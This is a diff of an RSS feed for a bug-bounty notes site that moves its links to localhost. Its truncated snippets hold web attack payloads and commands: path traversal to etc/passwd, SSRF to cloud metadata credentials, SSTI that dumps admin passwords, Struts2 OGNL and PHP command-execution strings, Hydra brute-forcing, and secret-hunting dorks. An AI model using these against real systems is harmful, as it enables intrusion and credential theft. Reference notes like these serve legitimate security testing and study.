-wget http://[host]/page.php?url=../../../../../../../file.html Tricks # PHP Filter b64 (php://filter/zlib.deflate/convert.base64-encode/resource=FILE) Nullbyte ending (%00) 403bypass section may help Bypasses # Nesting traversal sequences # ....// ....\/ ..../\ ....\\ URL Encoding # dot %2e forward slash %2f backslash %5c Double URL Encoding # dot %252e forward slash %252f backslash %255c Null Byte # Some applications check whether the user-supplied file name ends in a particular file type or set of file types, and reject attempts to access anything else.</description>
+      <guid>http://localhost/exploitation/vulnerability/lfi/</guid>
+      <description>LFI/RFI # https://github.com/kurobeats/fimap fimap -u &amp;#34;https://example.com?test=&amp;#34; Wget Sometimes browsers mess around with basic directory traversal sequences, but wget may work:
+wget http://[host]/page.php?url=../../../../../../../file.html Tricks PHP Filter b64 (php://filter/zlib.deflate/convert.base64-encode/resource=FILE) Nullbyte ending (%00) 403bypass section may help Bypasses Nesting traversal sequences ....// ....\/ ..../\ ....\\ URL Encoding dot %2e forward slash %2f backslash %5c Double URL Encoding dot %252e forward slash %252f backslash %255c Null Byte Some applications check whether the user-supplied file name ends in a particular file type or set of file types, and reject attempts to access anything else.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/openredirect/</link>
+      <link>http://localhost/exploitation/vulnerability/openredirect/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/openredirect/</guid>
-      <description>Open Redirect # Often a bug that brings impact when chained.
+      <guid>http://localhost/exploitation/vulnerability/openredirect/</guid>
+      <description>Open Redirect Often a bug that brings impact when chained.
 Using &amp;ldquo;https:&amp;rdquo; to bypass &amp;ldquo;//&amp;rdquo; blacklisted keyword
 https:google.com Using &amp;ldquo;//&amp;rdquo; to bypass &amp;ldquo;http&amp;rdquo; blacklisted keyword
 //google.com Using /\/ to bypass // blacklisted keyword
@@ -273,44 +287,44 @@ https:google.com Using &amp;ldquo;//&amp;rdquo; to bypass &amp;ldquo;http&amp;rd
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/other/javascriptfiles/</link>
+      <link>http://localhost/exploitation/vulnerability/other/bruteforce/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/other/javascriptfiles/</guid>
-      <description>Javascript Files # Linters # JSHint Download # getJS
+      <guid>http://localhost/exploitation/vulnerability/other/bruteforce/</guid>
+      <description>Password Bruteforcing Hash identify # https://github.com/noraj/haiti haiti hash Test for default credentials # https://github.com/ztgrace/changeme ./changeme.py example.com # https://github.com/x90skysn3k/brutespray See documentation Hydra Hydra is a command-line tool for online password attacks, such as website login pages and ssh.
+General format for website attacks: hydra -L &amp;lt;username list&amp;gt; -p &amp;lt;password list&amp;gt; [host] http-post-form &amp;#34;&amp;lt;path&amp;gt;:&amp;lt;form parameters&amp;gt;:&amp;lt;failed login message&amp;gt;&amp;#34; Wordpress Attack WordPress login page with a known username, success parameter S= instead of failure parameter, verbose output:</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>http://localhost/exploitation/vulnerability/other/javascriptfiles/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost/exploitation/vulnerability/other/javascriptfiles/</guid>
+      <description>Javascript Files Linters JSHint Download getJS
 Download all js files for each site https://github.com/003random/getJS
 JSScanner
 Download all js files for each site, beautify and run linkfinder: https://github.com/dark-warlord14/JSScanner
-Way Back Machine # Premise: Javascript files often gets changed, an attaker may find sensitive stuff in an older version of a JS file that is not alive anymore.
+Way Back Machine Premise: Javascript files often gets changed, an attaker may find sensitive stuff in an older version of a JS file that is not alive anymore.
 # https://github.com/jsvine/waybackpack # Clean known paths or JS files that are going to be useless in analysis.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/other/passwordbruteforce/</link>
+      <link>http://localhost/exploitation/vulnerability/other/smsverification/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/other/passwordbruteforce/</guid>
-      <description>Password Bruteforcing # Hash identify # # https://github.com/noraj/haiti haiti hash Test for default credentials # # https://github.com/ztgrace/changeme ./changeme.py example.com # https://github.com/x90skysn3k/brutespray See documentation Hydra # Hydra is a command-line tool for online password attacks, such as website login pages and ssh.
-General format for website attacks: # hydra -L &amp;lt;username list&amp;gt; -p &amp;lt;password list&amp;gt; [host] http-post-form &amp;#34;&amp;lt;path&amp;gt;:&amp;lt;form parameters&amp;gt;:&amp;lt;failed login message&amp;gt;&amp;#34; Wordpress # Attack WordPress login page with a known username, success parameter S= instead of failure parameter, verbose output:</description>
+      <guid>http://localhost/exploitation/vulnerability/other/smsverification/</guid>
+      <description> SMS Verification Online https://receive-smss.com/ eSim https://www.airalo.com/ </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/other/smsverification/</link>
+      <link>http://localhost/exploitation/vulnerability/other/uuid/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/other/smsverification/</guid>
-      <description> SMS Verification # Online # https://receive-smss.com/ eSim # https://www.airalo.com/ </description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://caon.io/exploitation/other/uuid/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://caon.io/exploitation/other/uuid/</guid>
-      <description>UUID # V1 # V1 UUIDs are not that unique, UUIDv1 contains sequences that can be guessed.
+      <guid>http://localhost/exploitation/vulnerability/other/uuid/</guid>
+      <description>UUID V1 V1 UUIDs are not that unique, UUIDv1 contains sequences that can be guessed.
 Since the first chunks are timestamps, one can bruteforce possibilities in between two known values, guessing the right one.
 https://github.com/felipecaon/uuidv1gen
 https://www.uuidtools.com/decode</description>
@@ -318,215 +332,204 @@ https://www.uuidtools.com/decode</description>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/other/webtech/</link>
+      <link>http://localhost/exploitation/vulnerability/other/webtech/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/other/webtech/</guid>
-      <description>Web technologies # Adobe AEM # aem-hacker aemscan aem-paths.txt writeup about aem exploitation Adobe Coldfusion # https://www.jomar.fr/posts/2021/basic_recon_to_rce/ API # API-Security-Checklist api-testing-checklist API Security 31-days-of-API-Security-Tips awesome-api-security web-api-pentesting OpenAPI Scanner General tips Mindmap Apache # Exploit default apache Apache Struts2 # Endpoints with .action, .do, .go are all using struts2 Content-Type: %{#context[&amp;#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;#39;].addHeader(&amp;#39;Added Header&amp;#39;,4*4)}.multipart/form-data Artifactory Hacking # Artifactory Hacking guide ASP.NET/IIS # ASPX and ASP.net have viewstate in cookie values, default ASP has not exploiting-viewstate viewgen shortname scanner XSS trace.</description>
+      <guid>http://localhost/exploitation/vulnerability/other/webtech/</guid>
+      <description>Web technologies Adobe AEM aem-hacker aemscan aem-paths.txt writeup about aem exploitation Adobe Coldfusion https://www.jomar.fr/posts/2021/basic_recon_to_rce/ API API-Security-Checklist api-testing-checklist API Security 31-days-of-API-Security-Tips awesome-api-security web-api-pentesting OpenAPI Scanner General tips Mindmap Apache Exploit default apache Apache Struts2 Endpoints with .action, .do, .go are all using struts2 Content-Type: %{#context[&amp;#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;#39;].addHeader(&amp;#39;Added Header&amp;#39;,4*4)}.multipart/form-data Artifactory Hacking Artifactory Hacking guide ASP.NET/IIS ASPX and ASP.net have viewstate in cookie values, default ASP has not exploiting-viewstate viewgen shortname scanner XSS trace.axd any.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/parameterpollution/</link>
+      <link>http://localhost/exploitation/vulnerability/parameterpollution/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/parameterpollution/</guid>
-      <description>HTTP Parameter Pollution # When searching for HPP keep in mind some servers handle parameters differently.
+      <guid>http://localhost/exploitation/vulnerability/parameterpollution/</guid>
+      <description>HTTP Parameter Pollution When searching for HPP keep in mind some servers handle parameters differently.
 Take http://example.com?username=foo&amp;amp;username=bar as an example.
 PHP and Apache use the last username occurence. Tomcat uses the first occurence. ASP and IIS uses all occurences A study containing all the servers can be found here: https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf
-Social Media Share Links # Often a websites offers its user a feature to share a given page in social media.</description>
+Social Media Share Links Often a websites offers its user a feature to share a given page in social media.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/pathtransversal/</link>
+      <link>http://localhost/exploitation/vulnerability/pathtransversal/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/pathtransversal/</guid>
-      <description>Path transversal # Char Encoded space %20 / %2f \ %5c % %25 . %2e f %66 e %65 Tricks # %252%66 -&amp;gt; %2f -&amp;gt; / %252%65 -&amp;gt; %2e -&amp;gt; . %252f -&amp;gt; %2f -&amp;gt; / %252e -&amp;gt; %2e -&amp;gt; . Payloads # ..;/ ..%5c ..%2f ../ ..\ ..;\ ..%252f %2e%2e%252f %252%66.%252%65 / // /// //// ///// ////// /////// //////// ///////// ////////// Files # env
+      <guid>http://localhost/exploitation/vulnerability/pathtransversal/</guid>
+      <description> Path transversal Char Encoded space %20 / %2f \ %5c % %25 . %2e f %66 e %65 Tricks %252%66 -&amp;gt; %2f -&amp;gt; / %252%65 -&amp;gt; %2e -&amp;gt; . %252f -&amp;gt; %2f -&amp;gt; / %252e -&amp;gt; %2e -&amp;gt; . Payloads ..;/ ..%5c ..%2f ../ ..\ ..;\ ..%252f %2e%2e%252f %252%66.%252%65 / // /// //// ///// ////// /////// //////// ///////// ////////// Files env
 etc/passwd
 Windows/win.ini
-Resources # URL https://github.</description>
+Resources URL https://github.com/GrrrDog/weird_proxies </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/prototypepollution/</link>
+      <link>http://localhost/exploitation/vulnerability/prototypepollution/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/prototypepollution/</guid>
-      <description>Prototype Pollution # https://github.com/BlackFan/client-side-prototype-pollution https://github.com/msrkp/PPScan Where to find? # Javascript driven frameworks (Express..) PHP # PHP internally uses parse_str() to parse parameters so it sees the char &amp;ldquo;[&amp;rdquo; &amp;amp; &amp;ldquo;_&amp;rdquo; as the same. PHP by default will use the last param as valid. In cases PHP is running on backend but front end validates the param, we can smuggle fake params to php
-example.com?account_id=gust&amp;amp;account[id=admin # Backend would execute guest and frontend admin Talks # https://www.</description>
+      <guid>http://localhost/exploitation/vulnerability/prototypepollution/</guid>
+      <description>Prototype Pollution https://github.com/BlackFan/client-side-prototype-pollution https://github.com/msrkp/PPScan Where to find? Javascript driven frameworks (Express..) PHP PHP internally uses parse_str() to parse parameters so it sees the char &amp;ldquo;[&amp;rdquo; &amp;amp; &amp;ldquo;_&amp;rdquo; as the same. PHP by default will use the last param as valid. In cases PHP is running on backend but front end validates the param, we can smuggle fake params to php
+example.com?account_id=gust&amp;amp;account[id=admin # Backend would execute guest and frontend admin Talks https://www.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/rce/</link>
+      <link>http://localhost/exploitation/vulnerability/rce/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/rce/</guid>
-      <description> Remote code execution # How to achieve RCE in known CMSes, frameworks and related # https://github.com/p0dalirius/Awesome-RCE-techniques PHP # ${@print(system(&amp;quot;whoami&amp;quot;))} </description>
+      <guid>http://localhost/exploitation/vulnerability/rce/</guid>
+      <description> Remote code execution How to achieve RCE in known CMSes, frameworks and related https://github.com/p0dalirius/Awesome-RCE-techniques PHP ${@print(system(&amp;quot;whoami&amp;quot;))} </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/requestsmuggling/</link>
+      <link>http://localhost/exploitation/vulnerability/requestsmuggling/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/requestsmuggling/</guid>
-      <description> Request Smuggling # It&amp;rsquo;s far more easier to search for articles explaining this concept.
-Tools # HTTP Request Smuggler, Burp extension # https://github.com/defparam/smuggler python3 smuggler.py -u &amp;lt;URL&amp;gt; Articles # https://portswigger.net/web-security/request-smuggling https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling https://paper.seebug.org/1049/ https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/ Exploitation # Bring impact by reporting smuggling chained with host injection. Users should make simple request with your injected header. </description>
+      <guid>http://localhost/exploitation/vulnerability/requestsmuggling/</guid>
+      <description> Request Smuggling It&amp;rsquo;s far more easier to search for articles explaining this concept.
+Tools HTTP Request Smuggler, Burp extension # https://github.com/defparam/smuggler python3 smuggler.py -u &amp;lt;URL&amp;gt; Articles https://portswigger.net/web-security/request-smuggling https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling https://paper.seebug.org/1049/ https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/ Exploitation Bring impact by reporting smuggling chained with host injection. Users should make simple request with your injected header. </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/sqli/</link>
+      <link>http://localhost/exploitation/vulnerability/sqli/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/sqli/</guid>
-      <description>SQLi # sqlmap # https://github.com/sqlmapproject/sqlmap # request in txt sqlmap -r search-test.txt -p parameter # post sqlmap -o -u &amp;#34;http://example.com/index.php?id=1&amp;#34; --data=&amp;#34;username=admin&amp;amp;password=pass&amp;amp;submit=+Login+&amp;#34; --method=POST # get sqlmap -u &amp;#34;http://example.com/index.php?id=1&amp;#34; # with point of injection (*) sqlmap -u &amp;#34;http://example.com/index.php?id=1*-133&amp;amp;debug=true&amp;#34; # risk sqlmap -u &amp;#34;http://example.com/index.php?id=1&amp;#34; --risk=3 --level=5 # headers sqlmap --headers=&amp;#34;HEADER&amp;#34; Temper # The ability to create payloads that can bypass waf
+      <guid>http://localhost/exploitation/vulnerability/sqli/</guid>
+      <description>SQLi sqlmap https://github.com/sqlmapproject/sqlmap # request in txt sqlmap -r search-test.txt -p parameter # post sqlmap -o -u &amp;#34;http://example.com/index.php?id=1&amp;#34; --data=&amp;#34;username=admin&amp;amp;password=pass&amp;amp;submit=+Login+&amp;#34; --method=POST # get sqlmap -u &amp;#34;http://example.com/index.php?id=1&amp;#34; # with point of injection (*) sqlmap -u &amp;#34;http://example.com/index.php?id=1*-133&amp;amp;debug=true&amp;#34; # risk sqlmap -u &amp;#34;http://example.com/index.php?id=1&amp;#34; --risk=3 --level=5 # headers sqlmap --headers=&amp;#34;HEADER&amp;#34; Temper The ability to create payloads that can bypass waf
 https://github.com/m4ll0k/Atlas Example:
---tamper=&amp;#34;between,randomcase&amp;#34; Tricks # Sometimes sites append an extra (&amp;rsquo;) character in injection.</description>
+--tamper=&amp;#34;between,randomcase&amp;#34; Tricks Sometimes sites append an extra (&amp;rsquo;) character in injection. It is possible to bypass this behavior by abusing UTF-8.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/ssrf/</link>
+      <link>http://localhost/exploitation/vulnerability/ssrf/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/ssrf/</guid>
-      <description>SSRF # Sometimes sites offer the possibility to make external requests using their server, what if we could user their “external” service to make requests for internal resources. That’s SSRF.
+      <guid>http://localhost/exploitation/vulnerability/ssrf/</guid>
+      <description>SSRF Sometimes sites offer the possibility to make external requests using their server, what if we could user their “external” service to make requests for internal resources. That’s SSRF.
 If the site is hosted in amazon, it is possible to get internal information by requesting the urls:
 http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/ http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/iam/securty-credentials Another idea is to try and request IP’s that we know that are internal:
-10.0.0.0 to 10.</description>
+10.0.0.0 to 10.255.255.55 100.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/ssti/</link>
+      <link>http://localhost/exploitation/vulnerability/ssti/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/ssti/</guid>
-      <description>SSTI # Tools # # https://github.com/epinna/tplmap tplmap.py -u &amp;#39;http://www.target.com/page?name=John&amp;#39; Python Django/Flask # Detection:
+      <guid>http://localhost/exploitation/vulnerability/ssti/</guid>
+      <description>SSTI Tools # https://github.com/epinna/tplmap tplmap.py -u &amp;#39;http://www.target.com/page?name=John&amp;#39; Python Django/Flask Detection:
 {% if &amp;#39;str&amp;#39; = &amp;#39;str&amp;#39; %} vuln {% endif %} {% debug %} Disclose pages:
 {% include &amp;#39;admin/base.html&amp;#39; %} Disclose log table:
-{% load log %}{% get_admin_log 10 as log %}{% for e in log %} {{e.user.get_username}} : {{e.user.password}}{% endfor %} ASP/APS.NET/ASPX # % is a key character If &amp;lt;% returns 500, try &amp;lt;%= 7*7 %&amp;gt; Tips # Try to SSTI with the fuzz string provided in cobalt.</description>
+{% load log %}{% get_admin_log 10 as log %}{% for e in log %} {{e.user.get_username}} : {{e.user.password}}{% endfor %} ASP/APS.NET/ASPX % is a key character If &amp;lt;% returns 500, try &amp;lt;%= 7*7 %&amp;gt; Tips Try to SSTI with the fuzz string provided in cobalt.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/wafbypass/</link>
+      <link>http://localhost/exploitation/vulnerability/xss/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/wafbypass/</guid>
-      <description>WAF Bypass Techniques # Try to find real IP address instead of TLD domain, see IP history websites section
-Awesome WAF
-How to bypass wafs
-# https://github.com/vincentcox/bypass-firewalls-by-DNS-history bash bypass-firewalls-by-DNS-history.sh -d example.com # Tool to fuzz urls for waf bypasses # https://github.com/RedSection/pFuzz # A lot of options, see docs IP history websites # https://whoisrequest.com/history/ https://viewdns.info/iphistory/ https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip https://securitytrails.com/domain/example.com/dns https://www.secjuice.com/finding-real-ips-of-origin-servers-behind-cloudflare-or-tor/ Quick Techniques # Given domain.com, try to subdomains that reflect the main application but are not protected:</description>
+      <guid>http://localhost/exploitation/vulnerability/xss/</guid>
+      <description>XSS # https://github.com/hahwul/dalfox dalfox url http://example.com cat urls | dalfox pipe - --skip-bav --skip-mining-all Find reflected parameters that could lead to XSS with Gxss
+# https://github.com/KathanP19/Gxss cat list | Gxss -c 100 -p REPLACE_STRING Semgrep Semgrep can be used to detect sink and sources and assist in XSS detection.
+Usage Download javascript files and beautify them (See Javascript), then run semgrep with
+semgrep -c xss.yaml scripts/* Hold down!
+Javascript files must be beautified, otherwise semgrep will no work properly.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/workflows/payment/</link>
+      <link>http://localhost/exploitation/vulnerability/xxe/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/workflows/payment/</guid>
-      <description>Payment Workflow # https://soroush.me/downloadable/common-security-issues-in-financially-orientated-web-applications-_v1.1.pdf</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://caon.io/exploitation/xss/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://caon.io/exploitation/xss/</guid>
-      <description>XSS # # https://github.com/hahwul/dalfox dalfox url http://example.com cat urls | dalfox pipe - --skip-bav --skip-mining-all Find reflected parameters that could lead to XSS with Gxss
-# https://github.com/KathanP19/Gxss cat list | Gxss -c 100 -p REPLACE_STRING Semgrep # Semgrep can be used to detect sink and sources and assist in XSS detection.
-Usage # Download javascript files and beautify them (See Javascript), then run semgrep with
-semgrep -c xss.yaml scripts/* Hold down!</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://caon.io/exploitation/xxe/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://caon.io/exploitation/xxe/</guid>
-      <description>XXE # Detection:
+      <guid>http://localhost/exploitation/vulnerability/xxe/</guid>
+      <description>XXE Detection:
 # Content type &amp;#34;application/json&amp;#34; or &amp;#34;application/x-www-form-urlencoded&amp;#34; to &amp;#34;applcation/xml&amp;#34;. # File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files. # If svg allowed in picture upload, you can inject xml in svgs. # If the web app offers RSS feeds, add your malicious code into the RSS. # Fuzz for /soap api, some applications still running soap apis # If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse Check:</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/asncidr/</link>
+      <link>http://localhost/exploitation/workflows/payment/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/asncidr/</guid>
-      <description>ASN # An autonomous system number (ASN) is a unique identifier that allows its autonomous system to exchange routing information with other systems.
+      <guid>http://localhost/exploitation/workflows/payment/</guid>
+      <description>Payment Workflow https://soroush.me/downloadable/common-security-issues-in-financially-orientated-web-applications-_v1.1.pdf</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>http://localhost/recon/asncidr/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost/recon/asncidr/</guid>
+      <description>ASN An autonomous system number (ASN) is a unique identifier that allows its autonomous system to exchange routing information with other systems.
 The five regional Internet registries are:
-African Network Information Center (AFRINIC) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin American and Caribbean Network Information Centre (LACNIC) Réseaux IP Européens Network Coordination Centre (RIPE NCC) Obtaining an ASN (autonomous system number) # By Organization Name # https://asrank.</description>
+African Network Information Center (AFRINIC) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin American and Caribbean Network Information Centre (LACNIC) Réseaux IP Européens Network Coordination Centre (RIPE NCC) Obtaining an ASN (autonomous system number) By Organization Name https://asrank.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/dorks/</link>
+      <link>http://localhost/recon/dorks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/dorks/</guid>
-      <description>Dorks # Google # # https://github.com/six2dez/degoogle_hunter ./degoogle_hunter.sh example.com # https://github.com/m3n0sd0n4ld/uDork ./uDork.sh united.com -u all ./uDork.sh united.com -e all # https://dorks.faisalahmed.me/ # Google dork helper, input url and the sites generates dorks site:npmjs.com &amp;#34;company&amp;#34; site:npm.runkit.com &amp;#34;company&amp;#34; site:pastebin.com &amp;#34;company&amp;#34; site:productforums.google.com &amp;#34;company&amp;#34; site:bitbucket.org &amp;#34;company&amp;#34; site:*.atlassian.net &amp;#34;company&amp;#34; site:trello.com &amp;#34;company&amp;#34; site:prezi.com &amp;#34;company&amp;#34; inurl:gitlab.com &amp;#34;company&amp;#34; Github # #https://github.com/obheda12/GitDorker python3 GitDorker.py -tf github_tokens -q example.com -p -ri -d Dorks/medium_dorks.txt -o gitdorker_out.txt # https://vsec7.github.io/ # Git dork helper, input url and the site generates dorks org:company &amp;#34;firebase&amp;#34; org:company &amp;#34;password&amp;#34; org:company &amp;#34;bucket_name&amp;#34; org:company &amp;#34;aws_access_key&amp;#34; org:company &amp;#34;aws_secret_key&amp;#34; org:company &amp;#34;S3_BUCKET&amp;#34; org:company &amp;#34;S3_ACCESS_KEY_ID&amp;#34; org:company &amp;#34;S3_SECRET_ACCESS_KEY&amp;#34; org:company &amp;#34;S3_ENDPOINT&amp;#34; org:company &amp;#34;AWS_ACCESS_KEY_ID&amp;#34; org:company &amp;#34;list_aws_accounts&amp;#34; https://gist.</description>
+      <guid>http://localhost/recon/dorks/</guid>
+      <description>Dorks Google # https://github.com/six2dez/degoogle_hunter ./degoogle_hunter.sh example.com # https://github.com/m3n0sd0n4ld/uDork ./uDork.sh united.com -u all ./uDork.sh united.com -e all # https://dorks.faisalahmed.me/ # Google dork helper, input url and the sites generates dorks site:npmjs.com &amp;#34;company&amp;#34; site:npm.runkit.com &amp;#34;company&amp;#34; site:pastebin.com &amp;#34;company&amp;#34; site:productforums.google.com &amp;#34;company&amp;#34; site:bitbucket.org &amp;#34;company&amp;#34; site:*.atlassian.net &amp;#34;company&amp;#34; site:trello.com &amp;#34;company&amp;#34; site:prezi.com &amp;#34;company&amp;#34; inurl:gitlab.com &amp;#34;company&amp;#34; Github #https://github.com/obheda12/GitDorker python3 GitDorker.py -tf github_tokens -q example.com -p -ri -d Dorks/medium_dorks.txt -o gitdorker_out.txt # https://vsec7.github.io/ # Git dork helper, input url and the site generates dorks org:company &amp;#34;firebase&amp;#34; org:company &amp;#34;password&amp;#34; org:company &amp;#34;bucket_name&amp;#34; org:company &amp;#34;aws_access_key&amp;#34; org:company &amp;#34;aws_secret_key&amp;#34; org:company &amp;#34;S3_BUCKET&amp;#34; org:company &amp;#34;S3_ACCESS_KEY_ID&amp;#34; org:company &amp;#34;S3_SECRET_ACCESS_KEY&amp;#34; org:company &amp;#34;S3_ENDPOINT&amp;#34; org:company &amp;#34;AWS_ACCESS_KEY_ID&amp;#34; org:company &amp;#34;list_aws_accounts&amp;#34; https://gist.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/fuzzing/</link>
+      <link>http://localhost/recon/fuzzing/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/fuzzing/</guid>
-      <description>Fuzzing # Rate Limited?
+      <guid>http://localhost/recon/fuzzing/</guid>
+      <description>Fuzzing Rate Limited?
 Try to run techniques from 403 Bypass
 Configure your options! You can customize your ffuf with special information, here&amp;rsquo;s a sample:
 https://gist.github.com/felipecaon/d1e7c980d7bab1312ea81df1d0241f42
-# https://github.com/ffuf/ffuf ffuf -w /path/to/wordlist -u https://target/FUZZ # Multiple sources ffuf -w http-methods:METHOD -w payloads:PAYLOAD -w headers:HEADER -u &amp;#34;https://example.com/PAYLOAD&amp;#34; -H &amp;#34;HEADER:127.0.0.1&amp;#34; -X &amp;#34;METHOD&amp;#34; # Multiple URLs and mutiple files example ffuf -u URL/FUZZ -w listofurls:URL -w listofpaths:FUZZ -maxtime 300 -t 500 -c -v # Cool ffuf flags -ac: Calibrate requests to unmatch false positives -recursion: recursion -se: Stop on erors -sf: Stop on 95% 403 Forbidden, possible WAF ban Remove noise # Ffuf can generate a large output, even with -ac flag enabled.</description>
+# https://github.com/ffuf/ffuf ffuf -w /path/to/wordlist -u https://target/FUZZ # Multiple sources ffuf -w http-methods:METHOD -w payloads:PAYLOAD -w headers:HEADER -u &amp;#34;https://example.com/PAYLOAD&amp;#34; -H &amp;#34;HEADER:127.0.0.1&amp;#34; -X &amp;#34;METHOD&amp;#34; # Multiple URLs and mutiple files example ffuf -u URL/FUZZ -w listofurls:URL -w listofpaths:FUZZ -maxtime 300 -t 500 -c -v # Cool ffuf flags -ac: Calibrate requests to unmatch false positives -recursion: recursion -se: Stop on erors -sf: Stop on 95% 403 Forbidden, possible WAF ban Remove noise Ffuf can generate a large output, even with -ac flag enabled.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/paramdiscovery/</link>
+      <link>http://localhost/recon/paramdiscovery/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/paramdiscovery/</guid>
-      <description>Parameter Discovery # There are two tools that I prefer when doing param scanning. X8, which is a tool made just for param discovery with advanced comparison and arjun, which does basically the same. From my tests I could not determine which one is better.
-X8 # # https://github.com/Sh1Yo/x8 x8 -u &amp;#34;https://example.com/&amp;#34; -w &amp;lt;wordlist&amp;gt; Arjun # # https://github.com/s0md3v/Arjun arjun -u https://target.com/ -w &amp;lt;wordlist&amp;gt; arjun -i urls.txt -oT output -m GET arjun -i urls.</description>
+      <guid>http://localhost/recon/paramdiscovery/</guid>
+      <description>Parameter Discovery There are two tools that I prefer when doing param scanning. X8, which is a tool made just for param discovery with advanced comparison and arjun, which does basically the same. From my tests I could not determine which one is better.
+X8 # https://github.com/Sh1Yo/x8 x8 -u &amp;#34;https://example.com/&amp;#34; -w &amp;lt;wordlist&amp;gt; Arjun # https://github.com/s0md3v/Arjun arjun -u https://target.com/ -w &amp;lt;wordlist&amp;gt; arjun -i urls.txt -oT output -m GET arjun -i urls.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/portscan/</link>
+      <link>http://localhost/recon/portscan/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/portscan/</guid>
-      <description> Port Scan # Nmap # # https://github.com/nmap/nmap ./configure make make install nmap -sC -sV example.com nmap example.com https://3os.org/penetration-testing/cheatsheets/nmap-cheatsheet/
-Naabu # # https://github.com/projectdiscovery/naabu naabu -p 80,443,21-23 -host example.com cat list | naabu -top-ports 100 -ep 80,443,8080,8443 </description>
+      <guid>http://localhost/recon/portscan/</guid>
